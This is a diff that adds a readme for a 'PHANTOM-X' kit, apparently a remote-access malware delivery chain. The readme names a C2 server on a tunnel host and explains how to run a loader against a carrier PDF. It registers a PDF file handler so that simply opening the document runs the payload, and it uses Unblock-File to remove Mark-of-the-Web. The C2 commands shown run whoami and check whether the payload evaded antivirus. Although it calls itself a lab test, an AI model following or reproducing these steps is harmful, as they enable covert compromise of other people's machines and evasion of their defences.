@@ -1,0 +1,77 @@
+﻿================================================================================
+PHANTOM-X :: REMOTE TEST KIT -- WHAT TO DO ON THE OTHER MACHINE
+================================================================================
+
+    The C2 address is already compiled in: c2box.trycloudflare.com:9001
+
+    It has to be reachable FROM HERE. If it is a 192.168.x.x or a
+    10.x.x.x address it is not: that is a private address and it does
+    not travel. Use a tunnel hostname, a public address, or a tailnet
+    address that is exposed.
+
+    The PDF opens the door. The loader is what opens it.
+
+
+STEP 1 -- THE LOADER, ONCE
+-------------------------------------------------------------------------------
+
+    Copy px_loader.exe to the machine and run it against the PDF:
+
+        .\px_loader.exe .\px_carrier.pdf
+
+    If you want the document to do it by itself, register the
+    association once:
+
+        .\install_pdf_handler.ps1 -LoaderPath .\px_loader.exe
+
+    After that, opening px_carrier.pdf is enough. The loader is
+    infrastructure; the PDF is the delivery, and it is the only thing
+    that crosses the network for every test.
+
+
+STEP 2 -- THE PDF, EVERY TIME
+-------------------------------------------------------------------------------
+
+    Send px_carrier.pdf however you like. Mail, a chat client, a file
+    share, a USB stick. It is a document with a program inside it.
+
+    The receiving machine will have the Mark-of-the-Web on it, because
+    it arrived from outside. That is not a problem to solve, it is a
+    variable to measure: the same PDF behaves differently depending on
+    how it arrived.
+
+    If the document will not run at all:
+
+        Unblock-File .\px_carrier.pdf
+
+    Take the mark off deliberately, and record that you did. The
+    difference between the marked and the unmarked run IS the
+    measurement.
+
+
+STEP 3 -- WATCH IT HAPPEN
+-------------------------------------------------------------------------------
+
+    On the C2 machine, the session appears:
+
+        c2> list
+        c2> exec 1 whoami
+        c2> cap 1 avstatus
+
+    The avstatus capability reports what the payload can see of the
+    endpoint it landed on: whether its own evasion took, whether real
+    time protection is on, and whether its own file is excluded from
+    scanning. That is the context every result needs.
+
+
+WHAT THIS TEST IS FOR
+-------------------------------------------------------------------------------
+
+    It answers one question: does the chain survive the trip? The
+    carrier has to survive the transfer, the loader has to survive the
+    receiving machine's policy, and the payload has to find a C2 that
+    is not on the same network.
+
+    It does not answer whether the endpoint will notice. That is a
+    different question, and the lab has a separate measurement for it.
+================================================================================
